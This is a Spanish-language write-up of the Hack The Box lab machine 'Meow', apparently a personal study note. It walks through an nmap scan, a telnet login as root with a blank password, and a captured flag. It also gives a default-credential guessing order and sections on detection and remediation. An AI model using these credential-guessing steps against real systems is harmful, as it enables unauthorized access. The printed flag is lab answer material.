---
tags:
  - htb
  - starting-point
  - tier-0
  - easy
  - linux
  - telnet
  - default-credentials
  - Terminada
ip: 10.129.31.187
os: Linux
difficulty: Easy
status: Terminada
tiempo: 1h 0m
fecha_inicio: 2026-06-05
fecha_completada: 2026-06-05
puntos: 150
mitre_tactics:
  - TA0001 Initial Access
  - TA0006 Credential Access
mitre_techniques:
  - T1078.001 Default Accounts
  - T1021 Remote Services
---

# 🖥️ Meow — Linux — Easy (Starting Point Tier 0)

> [!info] Resumen
> **IP:** `10.129.31.187` | **OS:** Linux | **Dificultad:** Easy | **Tier:** Starting Point 0
> **Estado:** Terminada | **Tiempo:** 1h 0m | **Fecha:** 2026-06-05
>
> Máquina introductoria del Starting Point. Expone un servicio Telnet con credenciales por defecto (root sin contraseña). No requiere escalada de privilegios — el foothold es directamente root.

---

## Contexto Técnico: ¿Por qué Telnet es un problema serio?

Telnet (RFC 854, 1983) es un protocolo de terminal remoto que transmite **todo en texto plano** — credenciales incluidas. Fue diseñado en una época donde la red era confiable y los actores maliciosos no existían en el modelo de amenaza.

Problemas concretos:
- **Sin cifrado:** cualquier actor con acceso al segmento de red puede capturar credenciales con Wireshark/tcpdump.
- **Sin autenticación mutua:** no verifica la identidad del servidor (vulnerable a MITM).
- **Puerto 23 visible:** cualquier escaneo de internet expone el servicio inmediatamente.

En entornos reales, Telnet aparece en:
- Routers y switches legacy (Cisco IOS antiguo)
- Dispositivos IoT/OT (PLCs, impresoras de red)
- Appliances industriales fuera de soporte
- Entornos de laboratorio/staging mal configurados

**Reemplazante correcto:** SSH (RFC 4251) — cifrado de canal completo + autenticación por clave.

---

## 1. Reconocimiento

### Nmap — Escaneo inicial

```bash
# Escaneo rápido de puertos abiertos
nmap -sV -sC -Pn 10.129.31.187 -oN nmap_meow.txt
```

**Resultado:**

```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```

**Análisis:** Un solo puerto abierto. Telnet en puerto estándar (23). Sin web, sin SMB, sin SSH. El vector de ataque es inmediato.

> [!note] Por qué `-sV -sC`
> `-sV` detecta versión del servicio. `-sC` ejecuta scripts NSE por defecto (equivale a `--script=default`). Para Telnet, los scripts NSE intentan banner grabbing y pueden revelar el sistema operativo. `-Pn` omite el ping inicial — útil cuando ICMP está bloqueado.

### Fingerprinting del servicio

```bash
# Banner grab manual
nc -nv 10.129.31.187 23
```

**Banner obtenido:**
```
  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█

Meow login:
```

Confirma Linux con Telnet activo. El banner es un rabbit hole — lo importante es el prompt de login.

---

## 2. Análisis de Credenciales

### Hipótesis

Sin credenciales conocidas, el camino es:
1. Credenciales por defecto conocidas del sistema/appliance
2. Fuerza bruta (ruidoso, innecesario aquí)
3. Usuarios comunes sin contraseña: `root`, `admin`, `user`, `guest`

### Vectores probados

| Usuario | Contraseña | Resultado |
|---------|------------|-----------|
| `admin` | (en blanco) | ❌ Login incorrecto |
| `root` | (en blanco) | ✅ Acceso root |

> [!tip] Patrón mental para credenciales por defecto
> Siempre probar en este orden: root/admin/user/guest con password en blanco → username=password → "admin/admin" → "admin/1234" → buscar en [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) o [cirt.net](https://www.cirt.net/passwords).

---

## 3. Foothold y Captura de Flag

```bash
telnet 10.129.31.187
# Meow login: root
# Password: (Enter vacío)
```

**Resultado:** Shell como `root` directamente.

```bash
# Verificar contexto
whoami && id && hostname
# root
# uid=0(root) gid=0(root) groups=0(root)
# Meow

# Localizar flag
ls /root/
# flag.txt  snap

cat /root/flag.txt
# b40abdfe23665f766f9c61ecba8a4c19
```

> [!success] Flag capturada
> `b40abdfe23665f766f9c61ecba8a4c19`
> No se requirió escalada de privilegios — el acceso inicial ya era root.

---

## 4. Perspectiva Defensiva

### ¿Qué vería un Blue Team?

| Fuente de Log | Evento detectable |
|--------------|-------------------|
| Firewall/IDS | Conexión entrante a TCP/23 desde IP externa |
| Syslog Linux | `telnetd: connect from <IP>` + sesión de login |
| Auditd | `type=LOGIN` con `uid=0` desde IP no corporativa |
| Network capture | Credenciales en texto plano en el flujo TCP |

Un IDS con regla básica (`alert tcp any any -> any 23`) alertaría inmediatamente. En un entorno real, si Telnet está expuesto a internet, es una misconfiguration crítica — cualquier escáner de internet (Shodan, Censys) ya la indexó.

### Remediación

1. **Deshabilitar Telnet** y reemplazar con SSH: `systemctl disable telnetd --now`
2. **Auditar puertos expuestos** periódicamente: `nmap -sV <IP-pública>`
3. **Forzar autenticación por clave** en SSH (deshabilitar passwords): `PasswordAuthentication no` en `/etc/ssh/sshd_config`
4. **Segmentar la red:** servicios de administración solo accesibles desde VPN o bastion host

---

## 5. MITRE ATT&CK Mapping

| Táctica | Técnica | ID | Descripción en este caso |
|---------|---------|----|--------------------------|
| Initial Access | Valid Accounts: Default Accounts | T1078.001 | Login con `root` sin contraseña |
| Lateral Movement | Remote Services | T1021 | Telnet como vector de acceso remoto |
| Discovery | System Information Discovery | T1082 | `whoami`, `id`, `hostname` post-acceso |

---

## 6. Lecciones Aprendidas

> [!danger] Lo que internalizé en esta máquina
> - **Default credentials son el vector más subestimado.** En entornos reales, el 20-30% de los accesos iniciales en engagements de pentesting provienen de credenciales por defecto o débiles (Verizon DBIR).
> - **Telnet en producción = misconfiguration crítica.** No es una vulnerabilidad del protocolo en sí — es una decisión operacional incorrecta.
> - **El reconocimiento define el camino.** Un solo puerto abierto elimina todas las otras hipótesis. No pierdas tiempo enumerando lo que no existe.

### ¿Dónde me bloqueé y por qué?

| Fase | Tiempo bloqueado | Causa real | Solución |
|------|-----------------|------------|----------|
| Login | 15 min | No probé `root` primero, fui a `admin` | Siempre probar `root` primero en Linux |

### Técnicas a profundizar (próximos pasos)

- [x] Telnet vs SSH — diferencias de seguridad → leer RFC 4251
- [x] Banner grabbing con nmap NSE → `nmap --script telnet-*`
- [ ] **Default credentials databases** → revisar [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [ ] **Shodan/Censys** — cómo estos servicios son indexados desde internet

### Herramientas Usadas

| Herramienta | Uso en esta máquina | Documentación |
|-------------|--------------------|-|
| `nmap` | Descubrimiento de puertos y versiones | [nmap.org](https://nmap.org/book/) |
| `telnet` | Conexión al servicio + login | `man telnet` |
| `nc` (netcat) | Banner grabbing manual | `man nc` |

### Conexión con Otras Máquinas / Técnicas

- Mismo concepto (credenciales por defecto en servicio remoto): `[[HTB/Fawn/Fawn]]` (FTP), `[[HTB/Explosion/Explosion]]` (RDP)
- Siguiente nivel del mismo vector: `[[HTB/Responder/Responder]]` (captura de hashes NTLMv2)
- Ver técnica: `[[Técnicas/Default-Credentials]]`

---

## 7. Referencias

- [RFC 854 — Telnet Protocol Specification](https://datatracker.ietf.org/doc/html/rfc854)
- [RFC 4251 — SSH Architecture](https://datatracker.ietf.org/doc/html/rfc4251)
- [HackTricks — Pentesting Telnet](https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet)
- [MITRE T1078.001 — Default Accounts](https://attack.mitre.org/techniques/T1078/001/)
- [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [Verizon DBIR 2024 — Credential-based attacks](https://www.verizon.com/business/resources/reports/dbir/)
